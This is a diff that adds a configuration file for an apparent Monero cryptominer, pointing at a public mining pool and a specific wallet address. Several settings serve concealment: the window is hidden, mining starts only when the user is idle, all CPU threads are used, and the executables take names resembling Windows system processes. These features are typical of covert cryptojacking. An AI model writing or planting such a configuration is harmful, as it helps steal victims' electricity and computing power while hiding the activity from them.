@@ -1,0 +1,17 @@
+[settings]
+pool=supportxmr.com:3333
+address=45hFtBX393vPo8u5HoeK1EHrGWxVmFPPJGYH515bktZyEacp3osHA4XK58NEAV4XLr9RB1UM2321rKBAindWhBnKEXLUdTW
+password=x
+worker_id=off
+worker_id_location=address
+difficulty=off
+
+[advanced]
+append=none
+process_priority=2
+hide_window=true
+process=idle_on
+idle_time_before_start=10
+x86_miner_name=mssm8.exe
+x64_miner_name=mssm6.exe
+threads=all
